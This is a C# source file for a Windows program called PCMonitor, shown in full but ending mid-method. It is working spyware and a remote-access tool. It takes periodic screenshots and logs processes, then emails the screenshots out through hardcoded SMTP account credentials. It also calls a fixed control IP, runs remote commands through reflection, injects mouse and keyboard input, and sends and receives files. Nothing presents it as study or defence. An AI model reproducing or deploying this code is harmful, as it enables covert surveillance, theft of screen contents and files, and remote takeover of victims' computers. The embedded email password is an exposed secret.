using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.IO;
using System.Diagnostics;
using System.Text.RegularExpressions;
using System.Reflection;
using System.Timers;
using System.Net.Sockets;
using System.Net.Mail;
using System.Net;
using System.Threading;

namespace PCMonitor
{
    public partial class MainForm : Form
    {
        #region 变量定义
        private static string directory = "C://PCMonitor//";//存储目录
        private static string fileUrl;//文件路径
        private static string direUrl;//每次启动文件夹路径
        private static string csvUrl = "processInfo.csv";

        private static string controlIP = "10.2.34.129";// 控制端IP

        private static System.Timers.Timer recordTimer = new System.Timers.Timer(10000);//记录图片
        private static System.Timers.Timer intervalTimer = new System.Timers.Timer(100);//监听鼠标
        private static System.Timers.Timer processTimer = new System.Timers.Timer(60000);//记录进程
        private static System.Timers.Timer netTimer = new System.Timers.Timer(20);//读取网络
        private static System.Timers.Timer connectTimer = new System.Timers.Timer(5000);//连接控制端

        private static string fileStr;//当前图片路径，在添加附件时用

        private static int recordTimes = 0;//截图张数

        private static bool processFilter = false;//过滤System32文件夹内的进程

        private static DateTime timeStart;//开始时间
        private static DateTime timeEnd;//结束时间

        private static int noChange = 0;//检测鼠标位置未改变的次数

        private static bool pauseState;//标志状态

        private static Image lastImg;//上一张图片
        private static Image img;//当前图片

        private static Point maxScreen;//屏幕最大点
        private static Point mousePos = new Point(0, 0);//鼠标当前位置

        private static Process[] pros;//所有进程
        private static List<ProInfo> proInfo = new List<ProInfo>();//存储进程信息数组

        private static bool ctrlClose = false;//标志是否远程控制关闭

        //发送邮件用变量
        private static String fromMail = "applegay@126.com";
        private static String mailPwd = "3141592653";
        private static string toMail = "gdhapple@163.com";
        private static bool MailOk = true;//首次发送成功
        private static bool Sending = false;//正在发送中
        private static bool RecOk = true;//接收文件成功
        private static bool SendOk = true;//接收文件成功
        private static int RecSleep = 2;//接收时延时，用于限制发送网速
        private static int SendBytes = 10240;//每次发送字节数
        private static int RecBytes = 10240;//每次接收字节数

        #endregion

        #region 自己写的方法

        /// <summary>
        /// 以附加模式写入文件
        /// </summary>
        /// <param name="writeStr">写入字符串</param>
        /// <returns>写入成功</returns>
        private static bool write(string writeStr)
        {
            try
            {
                FileStream fs = new FileStream(fileUrl, FileMode.Append);
                StreamWriter sw = new StreamWriter(fs);
                sw.Write(writeStr);
                sw.Close();
                fs.Close();
            }
            catch
            {
                return false;
            }
            return true;
        }

        /// <summary>
        /// 以指定的模式写入文件
        /// </summary>
        /// <param name="str">写入字符串</param>
        /// <param name="fm">写入模式</param>
        /// <returns>写入是否成功</returns>
        private static bool write(string str, FileMode fm)
        {
            try
            {
                FileStream fs = new FileStream(fileUrl, fm);
                StreamWriter sw = new StreamWriter(fs);
                sw.Write(str);
                sw.Close();
                fs.Close();
            }
            catch
            {
                return false;
            }
            return true;
        }

        /// <summary>
        /// 写入文件
        /// </summary>
        /// <param name="fileName">文件名</param>
        /// <param name="str">文件内容</param>
        /// <param name="fm">文件读写模式</param>
        /// <returns></returns>
        private static bool write(string fileName, string str, FileMode fm)
        {
            try
            {
                FileStream fs = new FileStream(fileName, fm);
                StreamWriter sw = new StreamWriter(fs);
                sw.Write(str);
                sw.Close();
                fs.Close();
            }
            catch
            {
                return false;
            }
            return true;
        }

        /// <summary>
        /// 读取文件
        /// </summary>
        /// <returns>读取的字符串</returns>
        private static string read()
        {
            string readStr = "";

            try
            {
                FileStream fs = new FileStream(fileUrl, FileMode.Open);
                StreamReader sr = new StreamReader(fs);
                readStr = sr.ReadToEnd();
            }
            catch
            {
                readStr = "false";
            }
            return readStr;
        }

        /// <summary>
        /// 启动时电脑进程信息
        /// </summary>
        private static void initProcess(bool filter)
        {
            pros = Process.GetProcesses();
            foreach (Process p in pros)
            {
                if (filter)
                {
                    try
                    {
                        //Regex regex=new Regex("[Cc]:\\\\[Ww][Ii][Nn][Oo][Ww][Ss]\\\\
                        //[Ss][Yy][Ss][Tt][Ee][Mm]32");regex.IsMatch(p.MainModule.FileName)
                        string fileName = p.MainModule.FileName;
                        if (fileName.Contains("\\SYSTEM32\\") || fileName.Contains("\\system32\\")
                            || fileName.Contains("\\System32\\"))
                        {
                            continue;
                        }
                    }
                    catch
                    { }
                }
                proInfo.Add(new ProInfo(p));
            }

            createCsvFile(csvUrl, proInfo,
                "--------------------,--------------------,--------------------,--------------------\r\n" +
                "初始进程,(时间：" + DateTime.Now.ToString() + "),共有 " + proInfo.Count.ToString() + " 个进程");
        }

        /// <summary>
        /// 判断是否存在某个进程
        /// </summary>
        /// <param name="pInfos"></param>
        /// <param name="processID"></param>
        /// <returns></returns>
        private static bool Exist(List<ProInfo> pInfos, string processID)
        {
            for (int i = 0; i < pInfos.Count; i++)
            {
                if (proInfo[i].proID == processID)
                    return true;
            }
            return false;
        }

        /// <summary>
        /// 判断是否存在某个进程
        /// </summary>
        /// <param name="pros"></param>
        /// <param name="processID"></param>
        /// <returns></returns>
        private static bool Exist(Process[] pros, string processID)
        {
            foreach (Process p in pros)
            {
                if (p.Id.ToString() == processID)
                    return true;
            }
            return false;
        }

        /// <summary>
        /// 创建csv文件
        /// </summary>
        /// <param name="fileName"></param>
        /// <param name="newInfo"></param>
        /// <param name="headStr"></param>
        private static void createCsvFile(string fileName, List<ProInfo> newInfo, string headStr)
        {
            string str = headStr + "\r\n";
            for (int i = 0; i < newInfo.Count; i++)
            {
                str += newInfo[i].getStr(",");
                str += "\r\n";
            }
            str += "\r\n";
            if (!write(directory + fileName, str, FileMode.Append))
                write(directory + fileName, str, FileMode.Create);
        }

        /// <summary>
        /// 截屏并保存
        /// </summary>
        private static void getScream()
        {
            try
            {
                Graphics g = Graphics.FromImage(img);
                g.CopyFromScreen(new Point(0, 0), new Point(0, 0), new Size(maxScreen), CopyPixelOperation.SourceCopy);
                string imageName = System.DateTime.Now.ToString("yyMM_ddHH_mmss");
                fileStr = direUrl + "//" + imageName + ".jpg";
                img.Save(fileStr, System.Drawing.Imaging.ImageFormat.Jpeg);
                lastImg = img;
            }
            catch
            { }
        }

        /// <summary>
        /// 获取缩略图
        /// </summary>
        /// <param name="originalImage"></param>
        /// <param name="thumMaxWidth"></param>
        /// <param name="thumMaxHeight"></param>
        /// <returns></returns>
        private static System.Drawing.Image GetThumbNailImage
            (System.Drawing.Image originalImage, int thumMaxWidth, int thumMaxHeight)
        {
            Size thumRealSize = Size.Empty;
            System.Drawing.Image newImage = originalImage;
            Graphics graphics = null;

            try
            {
                thumRealSize = new Size(thumMaxWidth, thumMaxHeight);
                newImage = new Bitmap(thumRealSize.Width, thumRealSize.Height);
                graphics = Graphics.FromImage(newImage);

                graphics.CompositingQuality = System.Drawing.Drawing2D.CompositingQuality.HighQuality;
                graphics.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.HighQualityBicubic;
                graphics.SmoothingMode = System.Drawing.Drawing2D.SmoothingMode.HighQuality;

                graphics.Clear(Color.Transparent);

                graphics.DrawImage(originalImage, new Rectangle(0, 0, thumRealSize.Width, thumRealSize.Height), new Rectangle(0, 0, originalImage.Width, originalImage.Height), GraphicsUnit.Pixel);
            }
            catch { }
            finally
            {
                if (graphics != null)
                {
                    graphics.Dispose();
                    graphics = null;
                }
            }

            return newImage;
        }

        #endregion

        #region 外部主要函数

        public MainForm()
        {
            InitializeComponent();
            init();
        }

        static void init()
        {
            maxScreen = new Point(Screen.AllScreens[0].Bounds.Width, Screen.AllScreens[0].Bounds.Height);

            img = new Bitmap(maxScreen.X, maxScreen.Y);
            lastImg = new Bitmap(maxScreen.X, maxScreen.Y);
        }

        public void initTimer()
        {
            recordTimer.Elapsed += new ElapsedEventHandler(recordTimer_Tick);
            intervalTimer.Elapsed += new ElapsedEventHandler(intervalTimer_Tick);
            processTimer.Elapsed += new ElapsedEventHandler(processTimer_Tick);
            netTimer.Elapsed += new ElapsedEventHandler(netTimer_Tick);
            connectTimer.Elapsed += new ElapsedEventHandler(connectTimer_Tick);

            recordTimer.Enabled = true;
            intervalTimer.Enabled = true;
            processTimer.Enabled = true;
            netTimer.Enabled = true;
            connectTimer.Enabled = true;
        }

        private void MainForm_Load(object sender, EventArgs e)
        {
            timeStart = System.DateTime.Now;

            direUrl = directory + timeStart.ToString("yyMM_ddHH_mmss");
            if (!Directory.Exists(direUrl))
                Directory.CreateDirectory(direUrl);
            fileUrl = directory + "record.dat";

            string str = "--------------------,--------------------,--------------------,--------------------\r\n" +
                "启动时间： " + timeStart.ToString() + "\r\n";
            if (!write(str))
                write(str, FileMode.CreateNew);

            initTimer();

            getScream();
            recordTimes++;

            initProcess(processFilter);//初始化进程获取信息

            SendRec.Listen();

            SendRec.sendStr("", controlIP);
        }

        /// <summary>
        /// 处理接收到的信息
        /// </summary>
        /// <param name="str">接收到的字符串</param>
        void dealRec(string str)
        {
            if (str.Contains("reNewSelf"))//关闭当前监控重新打开再监控
            {
                string[] _str = str.Split('◇');
                SendRec.Close();
                startPro(_str[1]);
                reNewSelf(_str[1]);
                return;
            }
            else if (str.Contains("closeSelf"))//关闭监控不在打开
            {
                reNewSelf("");
                return;
            }
            else
            {
                try
                {
                    string[] strs = str.Split('◇');

                    string[] paras = new string[strs.Length - 1];

                    for (int i = 0; i < paras.Length; i++)
                    {
                        paras[i] = strs[i + 1];
                    }

                    object obj;
                    if (strs[0].Substring(0, 3) == "set")
                    {
                        obj = setProperty(strs[0], paras);
                    }
                    else
                    {
                        obj = useLocalMethod(strs[0], paras);
                    }
                    string temp = "";
                    if (obj.GetType().Equals(Type.GetType("System.Byte[]")))
                        temp = SendRec.sendPic((byte[])obj);
                    else
                        temp = obj.ToString();
                    SendRec.sendStr(temp);
                }
                catch
                {
                    SendRec.sendStr("远程处理出错！ 时间：" + DateTime.Now.ToString());
                }
            }
            GC.Collect();
            //connectTimer.Enabled = false;不在发送请求
        }

        /// <summary>
        /// 使用反射机制调用函数
        /// </summary>
        /// <param name="methodName">函数名</param>
        /// <param name="paras">函数参数</param>
        /// <returns></returns>
        static object useLocalMethod(string methodName, string[] paras)
        {
            Type vType = Type.GetType("PCMonitor.MainForm");
            if (vType == null) return "类未找到！ 时间为：" + DateTime.Now.ToString();
            //Text = vType.Name;

            object vObject = Activator.CreateInstance(vType);
            object result;

            MethodInfo vMethodInfo = vType.GetMethod(methodName);

            if (vMethodInfo == null)
            {
                return "函数未找到！ 时间为：" + DateTime.Now.ToString();
            }
            try
            {
                result = vMethodInfo.Invoke(vObject, paras);
            }
            catch
            {
                return "函数找到，但执行出错，可能是参数个数或类型错误！ 时间为：" + DateTime.Now.ToString();
            }
            return result;
        }

        #endregion

        #region 双击自动生成方法

        /// <summary>
        /// 记录屏幕截图
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private static void recordTimer_Tick(object sender, ElapsedEventArgs e)
        {
            getScream();
            recordTimes++;

            GC.Collect();
        }

        /// <summary>
        /// 关闭程序
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void MainForm_FormClosing(object sender, FormClosingEventArgs e)
        {
            try
            {
                recordTimer.Enabled = false;
                intervalTimer.Enabled = false;
                processTimer.Enabled = false;
                timeEnd = System.DateTime.Now;

                SendRec.Close();

                string str = "从 " + timeStart.ToString() + " 到 " + timeEnd.ToString() + "共截图 " + recordTimes.ToString() + " 张。\r\n" +
                    "--------------------,--------------------,--------------------,--------------------\r\n\r\n";
                if (!write(str))
                    write(str, FileMode.CreateNew);

                str = "";
                if (ctrlClose)
                {
                    str += "远程控制关闭。    ";
                }
                str += "退出监控,(时间：" + DateTime.Now.ToString() + ")\r\n" +
                                "--------------------,--------------------,--------------------,--------------------\r\n\r\n";
                if (!write(directory + csvUrl, str, FileMode.Append))
                    write(directory + csvUrl, str, FileMode.CreateNew);
            }
            catch
            {
                //关闭反应慢
            }
        }

        /// <summary>
        /// 以鼠标变化改变监控状态
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private static void intervalTimer_Tick(object sender, ElapsedEventArgs e)
        {
            if (mousePos != Cursor.Position)
            {
                noChange = 0;
                recordTimer.Enabled = true;
                processTimer.Enabled = true;
                mousePos = Cursor.Position;

                if (pauseState)
                {
                    string str = "继续捕获： " + DateTime.Now.ToString() + "\r\n";
                    if (!write(str))
                        write(str, FileMode.CreateNew);
                    pauseState = false;
                    getScream();
                }
            }
            else
            {
                if (recordTimer.Enabled)
                    noChange++;
            }
            if (noChange > 200)
            {
                recordTimer.Enabled = false;
                processTimer.Enabled = false;
                if (!pauseState)
                {
                    string str = "暂停捕获： " + DateTime.Now.ToString() + "\r\n";
                    if (!write(str))
                        write(str, FileMode.CreateNew);
                    pauseState = true;
                }
            }
        }

        /// <summary>
        /// 监控进程信息
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private static void processTimer_Tick(object sender, ElapsedEventArgs e)
        {
            if (!MailOk && !Sending)//判断邮件是否发送
                SendMail("", "True");

            pros = Process.GetProcesses();
            List<ProInfo> newInfo = new List<ProInfo>();
            List<ProInfo> oldInfo = new List<ProInfo>();

            foreach (ProInfo pi in proInfo)
            {
                if (!Exist(pros, pi.proID))
                {
                    oldInfo.Add(pi);
                }
            }

            foreach (ProInfo pi in oldInfo)
            {
                proInfo.Remove(pi);
            }
            if (oldInfo.Count > 0)
                createCsvFile(csvUrl, oldInfo, "退出进程,(时间：" + DateTime.Now.ToString() + ")");


            foreach (Process p in pros)
            {
                if (processFilter)
                {
                    try
                    {
                        string fileName = p.MainModule.FileName;
                        if (fileName.Contains("\\SYSTEM32\\") || fileName.Contains("\\system32\\")
                            || fileName.Contains("\\System32\\"))//忽略system32系统进程
                        {
                            continue;
                        }
                    }
                    catch
                    { }
                }
                if (Exist(proInfo, p.Id.ToString()))
                    continue;
                else//新进程出现
                {
                    newInfo.Add(new ProInfo(p));
                }
            }

            foreach (ProInfo pi in newInfo)
            {
                proInfo.Add(pi);
            }
            if (newInfo.Count > 0)
                createCsvFile(csvUrl, newInfo, "新增进程,(时间：" + DateTime.Now.ToString() + ")");
        }

        #endregion

        #region 发送邮件部分

        /// <summary>
        /// 发送邮件
        /// </summary>
        /// <param name="fileUrl">附件地址，以~分</param>
        /// <param name="screen">是否发送截屏</param>
        /// <returns></returns>
        public static string SendMail(string fileUrl, string screen)
        {
            Sending = true;
            MailAddress from = new MailAddress(fromMail);
            MailAddress to = new MailAddress(toMail);

            MailMessage message = new MailMessage(from, to);
            message.Subject = "M邮件 " + SendRec.localInfo;//主题
            message.SubjectEncoding = System.Text.Encoding.UTF8;

            Attachment attachFile = new Attachment(fileStr);
            if (screen == "True")
                message.Attachments.Add(attachFile);

            string[] files = fileUrl.Split('~');
            for (int i = 0; i < files.Length; i++)
            {
                if (File.Exists(files[i]))
                {
                    Attachment attachFile1 = new Attachment(fileUrl);
                    message.Attachments.Add(attachFile1);
                }
            }

            try
            {
                SmtpClient client = new SmtpClient("smtp." + from.Host);

                SendMail(client, from, mailPwd, to, message);

                MailOk = true;
                Sending = false;
                return "发送邮件成功！包含附件：" + fileUrl + "  含截图？" + screen + "   " + DateTime.Now.ToString();
            }
            catch (SmtpException ex)
            {
                //如果错误原因是没有找到服务器，则尝试不加smtp.前缀的服务器
                if (ex.StatusCode == SmtpStatusCode.GeneralFailure)
                {
                    try
                    {
                        //有些邮件服务器不加smtp.前缀
                        SmtpClient client = new SmtpClient(from.Host);
                        SendMail(client, from, mailPwd, to, message);
                        MailOk = true;
                        Sending = false;
                        return "发送邮件成功！包含附件：" + fileUrl + "  含截图？" + screen + "   " + DateTime.Now.ToString();

                    }
                    catch (SmtpException err)
                    {
                        MailOk = false;
                        Sending = false;
                        return "发送邮件失败！" + err.Message + "   " + DateTime.Now.ToString();
                    }
                }
                else
                {
                    MailOk = false;
                    Sending = false;
                    return "发送邮件失败！" + ex.Message + "   " + DateTime.Now.ToString();
                }
            }
        }

        //根据指定的参数发送邮件
        private static void SendMail(SmtpClient client, MailAddress from, string password,
             MailAddress to, MailMessage message)
        {
            //不使用默认凭证,注意此句必须放在client.Credentials的上面
            client.UseDefaultCredentials = false;
            //指定用户名、密码
            client.Credentials = new NetworkCredential(from.Address, password);
            //邮件通过网络发送到服务器
            client.DeliveryMethod = SmtpDeliveryMethod.Network;
            try
            {
                client.Send(message);
            }
            catch
            {
                throw;
            }
            finally
            {
                //及时释放占用的资源
                message.Dispose();
            }
        }

        #endregion

        #region 文件传输控制

        /// <summary>
        /// 发送文件
        /// </summary>
        public static string sendFile(string path)
        {
            if (!File.Exists(path))
            {
                return "文件：" + path + "不存在！  时间：" + DateTime.Now.ToString();
            }

            FileInfo f = new FileInfo(path);

            string Size = "0 K";
            if (f.Length < 1024)
            {
                Size = f.Length.ToString() + " B";
            }
            else if (f.Length < 1024000)
            {
                Size = (f.Length / 1024).ToString() + " K";
            }
            else
            {
                Size = (f.Length / 1024).ToString().Substring(0, (f.Length / 1024).ToString().Length - 3) + "," +
                    (f.Length / 1024).ToString().Substring((f.Length / 1024).ToString().Length - 3, 3) + " K";
            }

            ThreadPool.QueueUserWorkItem(new WaitCallback(tSendFile), path);

            return "文件存在！大小为： " + Size + "  时间为：" + DateTime.Now.ToString();

        }

        /// <summary>
        /// 发送文件
        /// </summary>
        /// <param name="path"></param>
        static void tSendFile(object path)
        {
            try
            {
                TcpClient sendClient = new TcpClient(SendRec.client, SendRec.fOutPort);
                NetworkStream sendns = sendClient.GetStream();
                FileStream fs = File.Open(path.ToString(), FileMode.Open, FileAccess.Read);
                BinaryReader binRead = new BinaryReader(fs);

                try
                {
                    byte[] bytes = new byte[10240];
                    int byteNum = 0;
                    do
                    {
                        byteNum = binRead.Read(bytes, 0, SendBytes);
                        try
                        {
                            sendns.Write(bytes, 0, byteNum);
                        }
                        catch (Exception ex)
                        {
                            if (ex.Message.Contains("目标机器断开一个连接"))
                            {
                                SendRec.sendStr("文件续传！ 时间为：" + DateTime.Now.ToString());
                                Thread.Sleep(10);
                            }
                            sendns.Write(bytes, 0, byteNum);
                        }
                    }
                    while (byteNum == SendBytes && !SendOk);

                    SendOk = true;

                    SendRec.sendStr("文件发送完成！ 时间为：" + DateTime.Now.ToString());
                }
                catch (Exception ex)
                {
                    SendRec.sendStr("文件：" + ex.Message + "  时间为：" + DateTime.Now.ToString());
                }
                finally
                {
                    binRead.Close();
                    fs.Close();
                    sendns.Close();
                    SendOk = true;
                }
            }
            catch (Exception ex2)
            {
                SendRec.sendStr("文件：" + ex2.Message + "  时间为：" + DateTime.Now.ToString());
                SendOk = true;
            }
        }

        /// <summary>
        /// 接收文件
        /// </summary>
        /// <param name="path">文件保存路径</param>
        /// <returns></returns>
        public static string receiveFile(string path)
        {
            string dire = System.IO.Path.GetDirectoryName(path); 
            if (!Directory.Exists(dire))
                Directory.CreateDirectory(dire);

            RecOk = false;

            ThreadPool.QueueUserWorkItem(new WaitCallback(tRecFile), path);

            Thread.Sleep(5);

            return "文件：已启动接收文件线程。  时间为：" + DateTime.Now.ToString();
        }

        /// <summary>
        /// 发送文件
        /// </summary>
        /// <param name="path">文件路径</param>
        static void tRecFile(object path)
        {
            try
            {
                TcpClient tcpclient = SendRec.fileListener.AcceptTcpClient();
                FileStream fs = new FileStream(path.ToString(), FileMode.Append, FileAccess.Write);
                BinaryWriter binWrite = new BinaryWriter(fs);

                try
                {
                    int allSize = 0;
                    if (tcpclient != null)
                    {
                        NetworkStream recns = tcpclient.GetStream();
                        byte[] buf = new byte[RecBytes];
                        int byteNum;
                        do
                        {
                            byteNum = recns.Read(buf, 0, RecBytes);
                            allSize += byteNum;
                            binWrite.Write(buf, 0, byteNum);
                            Thread.Sleep(RecSleep);
                        }
                        while (!RecOk);

                        recns.Close();
                    }
                    SendRec.sendStr("文件接收成功！接收大小为:" + allSize.ToString() + "字节。  时间为：" + DateTime.Now.ToString());
                }
                catch (Exception ex2)
                {
                    SendRec.sendStr("文件：" + ex2.Message + "   时间：" + DateTime.Now.ToString());
                }
                finally
                {
                    binWrite.Close();
                    fs.Close();
                    RecOk = true;
                }
            }
            catch (Exception ex)
            {
                SendRec.sendStr("文件：" + ex.Message + "   时间：" + DateTime.Now.ToString());
                RecOk = true;
            }
        }

        #endregion

        #region 远程控制鼠标键盘方法

        /// <summary>
        /// 鼠标控制参数
        /// </summary>
        const int MOUSEEVENTF_LEFTDOWN = 0x2;
        const int MOUSEEVENTF_LEFTUP = 0x4;
        const int MOUSEEVENTF_MIDDLEDOWN = 0x20;
        const int MOUSEEVENTF_MIDDLEUP = 0x40;
        const int MOUSEEVENTF_MOVE = 0x1;
        const int MOUSEEVENTF_ABSOLUTE = 0x8000;
        const int MOUSEEVENTF_RIGHTDOWN = 0x8;
        const int MOUSEEVENTF_RIGHTUP = 0x10;

        [System.Runtime.InteropServices.DllImport("user32.dll", EntryPoint = "SetCursorPos")]
        public extern static bool SetCursorPos(int x, int y);

        [System.Runtime.InteropServices.DllImport("user32.dll")]
        public static extern int mouse_event(int dwFlags, int dx, int dy, int cButtons, int dwExtraInfo);

        [System.Runtime.InteropServices.DllImport("User32")]
        public extern static bool GetCursorPos(out Point p);

        [System.Runtime.InteropServices.DllImport("User32")]
        public extern static int ShowCursor(bool bShow);

        [System.Runtime.InteropServices.DllImport("user32.dll", EntryPoint = "keybd_event")]
        public static extern void keybd_event(byte bVk, byte bScan, int dwFlags, int dwExtraInfo);

        /// <summary>
        /// 移动鼠标位置
        /// </summary>
        /// <param name="x"></param>
        /// <param name="y"></param>
        /// <returns></returns>
        public static string cursor(string x, string y)
        {
            try
            {
                int i = int.Parse(x);
                int j = int.Parse(y);
                if (SetCursorPos(i, j))
                {
                    GC.Collect();
                    return "鼠标移动成功！ 时间为：" + DateTime.Now.ToString();
                }
                else
                {
                    GC.Collect();
                    return "鼠标移动出错！ 时间为：" + DateTime.Now.ToString();
                }
            }
            catch
            {
                GC.Collect();
                return "参数必须是两个整数！ 时间为：" + DateTime.Now.ToString();
            }
        }

        /// <summary>
        /// 鼠标事件
        /// </summary>
        /// <param name="arg">鼠标左右中键</param>
        /// <param name="x">鼠标x坐标</param>
        /// <param name="y">鼠标y坐标</param>
        /// <param name="para">鼠标按下，放开，单击双击</param>
        /// <param name="curMove">显示移动鼠标</param>
        /// <returns></returns>
        public static string mouseevent(string arg, string x, string y, string para, string curMove)
        {
            Point p = new Point();
            GetCursorPos(out p);

            try
            {
                int a = int.Parse(arg);
                int b = a * 2;
                int i = int.Parse(x);
                int j = int.Parse(y);
                ShowCursor(false);
                SetCursorPos(i, j);

                //mouse_event(MOUSEEVENTF_MOVE, i, j, 0, 0);

                if (para == "0")
                {
                    mouse_event(b, i, j, 0, 0);
                }
                else if (para == "1")
                {
                    mouse_event(a, i, j, 0, 0);
                    mouse_event(b, i, j, 0, 0);
                }
                else if (para == "2")
                {
                    mouse_event(a, i, j, 0, 0);
                    mouse_event(b, i, j, 0, 0);
                    mouse_event(a, i, j, 0, 0);
                    mouse_event(b, i, j, 0, 0);
                }
                else if (para == "3")
                {
                    mouse_event(a, i, j, 0, 0);
                }
            }
            catch
            {
                GC.Collect();
                return "出错了，参数必须是四个整数！ 时间为：" + DateTime.Now.ToString();
            }
            finally
            {
                if (curMove == "0")
                    SetCursorPos(p.X, p.Y);
                ShowCursor(true);
            }
            GC.Collect();
            return "鼠标控制成功(arg=" + arg + ",x y=" + x + " " + y + ",para=" + para + ",curMove=" + curMove + ")！ 时间为：" + DateTime.Now.ToString();
        }

        /// <summary>
        /// 不移动鼠标控制
        /// </summary>
        /// <param name="arg">左中右键</param>
        /// <param name="para">单双</param>
        /// <returns></returns>
        public static string dmouseevent(string arg, string para)
        {
            try
            {
                int a = int.Parse(arg);
                int b = a * 2;

                //mouse_event(MOUSEEVENTF_MOVE, i, j, 0, 0);

                if (para == "0")
                {
                    mouse_event(b, 0, 0, 0, 0);
                }
                else if (para == "1")
                {
                    mouse_event(a, 0, 0, 0, 0);
                    mouse_event(b, 0, 0, 0, 0);
                }
                else if (para == "2")
                {
                    mouse_event(a, 0, 0, 0, 0);
                    mouse_event(b, 0, 0, 0, 0);
                    mouse_event(a, 0, 0, 0, 0);
                    mouse_event(b, 0, 0, 0, 0);
                }
                else if (para == "3")
                {
                    mouse_event(a, 0, 0, 0, 0);
                }
            }
            catch
            {
                GC.Collect();
                return "出错了，参数必须是两个整数！ 时间为：" + DateTime.Now.ToString();
            }

            GC.Collect();
            return "鼠标控制成功(arg=" + arg + ",para=" + para + ")！ 时间为：" + DateTime.Now.ToString();
        }

        /// <summary>
        /// 键盘事件
        /// </summary>
        /// <param name="key">键盘码</param>
        /// <param name="isup">是否放开</param>
        /// <returns></returns>
        public static string keyevent(string key, string isup)
        {
            try
            {
                string[] ks = key.Split('-');
                for (int i = 0; i < ks.Length; i++)
                {
                    byte b = byte.Parse(ks[i]);
                    keybd_event(b, 0, 0, 0);
                    if (isup == "1")
                    {
                        keybd_event(b, 0, 2, 0);
                    }
                }
                GC.Collect();
                return "键盘控制成功！ 时间为：" + DateTime.Now.ToString();
            }
            catch
            {
                GC.Collect();
                return "键盘控制失败！ 时间为：" + DateTime.Now.ToString();
            }
        }

        #endregion

        #region 远程控制命令方法

        /// <summary>
        /// 设置属性
        /// </summary>
        /// <param name="setName">设置类型</param>
        /// <param name="paras">设置参数</param>
        /// <returns></returns>
        static object setProperty(string setName, string[] paras)
        {
            object result = "初始化状态！";

            try
            {
                if (setName == "setEnable")
                {
                    result = setEnable(paras[0], paras[1], paras[2]);
                }
                else if (setName == "setAtt")
                {
                    result = setAtt(paras[0], paras[1]);
                }
            }
            catch
            {
                result = "设置属性出错，可能是参数个数不符合！ 时间：" + DateTime.Now.ToString();
            }

            return result;
        }

        /// <summary>
        /// 设置参数属性
        /// </summary>
        /// <param name="attName"></param>
        /// <param name="attValue"></param>
        /// <returns></returns>
        static string setAtt(string attName, string attValue)
        {
            string str = "";
            try
            {
                switch (attName)
                {
                    case "fromMail": fromMail = attValue; break;
                    case "toMail": toMail = attValue; break;
                    case "mailPwd": mailPwd = attValue; break;
                    case "controlIP": controlIP = attValue; break;
                    case "RecOk": RecOk = bool.Parse(attValue); break;
                    case "SendOk": SendOk = bool.Parse(attValue); break;
                    case "RecSleep": RecSleep = int.Parse(attValue); break;
                    case "SendBytes": SendBytes = int.Parse(attValue); break;
                    case "RecBytes": RecBytes = int.Parse(attValue); break;
                    default: str = "没有找到属性:" + attName; break;
                }
                if (str == "")
                    str = "修改属性：" + attName + "=" + attValue + "成功！  时间为：" + DateTime.Now.ToString();
                else
                    str += "  " + DateTime.Now.ToString();
            }
            catch (Exception ex)
            {
                str = ex.Message + "    时间" + DateTime.Now.ToString();
            }
            return str;
        }

        /// <summary>
        /// 设置Timer的Enable属性
        /// </summary>
        /// <param name="ctrlName">控件名</param>
        /// <param name="bl">TrueFalse</param>
        /// <returns></returns>
        static string setEnable(string ctrlName, string bl, string interval)
        {
            try
            {
                int interv = -1;
                if (interval != "")
                    interv = int.Parse(interval);
                bool enable = false;
                if (bl == "true")
                    enable = true;

                string xx = "false";

                switch (ctrlName)
                {
                    case "recordTimer": recordTimer.Enabled = enable;
                        xx = recordTimer.Enabled.ToString();
                        if (interval != "")
                            recordTimer.Interval = interv;
                        break;
                    case "intervalTimer": intervalTimer.Enabled = enable;
                        xx = intervalTimer.Enabled.ToString();
                        if (interval != "")
                            intervalTimer.Interval = interv;
                        break;
                    case "processTimer": processTimer.Enabled = enable;
                        xx = processTimer.Enabled.ToString();
                        if (interval != "")
                            processTimer.Interval = interv;
                        break;
                    case "netTimer": netTimer.Enabled = enable;
                        xx = netTimer.Enabled.ToString();
                        if (interval != "")
                            netTimer.Interval = interv;
                        break;
                    case "connectTimer": connectTimer.Enabled = enable;
                        xx = connectTimer.Enabled.ToString();
                        if (interval != "")
                            connectTimer.Interval = interv;
                        break;
                    default: return "Timer " + ctrlName + " 不存在！ 时间：" + DateTime.Now.ToString();
                }

                return ctrlName + "设置属性为：" + xx + " 时间：" + DateTime.Now.ToString();
            }
            catch
            {
                return "Timer的Enable属性设置出错！ 时间：" + DateTime.Now.ToString();
            }
        }

        /// <summary>
        /// 查找文件
        /// </summary>
        /// <param name="folderName">当前目录</param>
        /// <param name="findStr">查找字符串</param>
        /// <returns></returns>
        static string FindFile(string folderName, string findStr,bool inFind,string inter)
        {
            string str = "";
            string inter2 = inter + "  ";
            try
            {
                DirectoryInfo dire = new DirectoryInfo(folderName);
                DirectoryInfo[] cdire = dire.GetDirectories();
                str = "\r\n"+inter + "目录部分：\r\n";
                foreach (DirectoryInfo d in cdire)
                {
                    if (d.FullName.Contains(findStr))
                        str += inter2+d.FullName + "\r\n";

                    if (inFind)
                    {
                        str += FindFile(d.FullName, findStr, inFind,inter2);
                    }
                }
                FileInfo[] files = dire.GetFiles();
                str += "\r\n"+inter2+"文件部分\r\n";
                string s;
                int l;
                foreach (FileInfo f in files)
                {
                    if (f.FullName.Contains(findStr))
                    {
                        s = (f.Length / 1024).ToString();
                        l = s.Length;
                        if (l > 3)
                        {
                            str += inter2+f.FullName + "      Size:" + s.Substring(0, l - 3) + "," + s.Substring(l - 3, 3) + "K\r\n";
                        }
                        else
                        {
                            str += inter2 + f.FullName + "      Size:" + s + "K\r\n";
                        }
                    }
                }
            }
            catch
            {
                str = "路径：" + folderName + "加载文件出错！";
            }
            return str + "\r\n";
        }

        /// <summary>
        /// 获取文件夹内容
        /// </summary>
        /// <param name="folderName"></param>
        /// <returns></returns>
        public static string dirFile(string folderName)
        {
            string str = "文件夹不存在";
            try
            {
                DirectoryInfo dire = new DirectoryInfo(folderName);
                DirectoryInfo[] cdire = dire.GetDirectories();
                str = "目录部分：\r\n    ";
                foreach (DirectoryInfo d in cdire)
                {
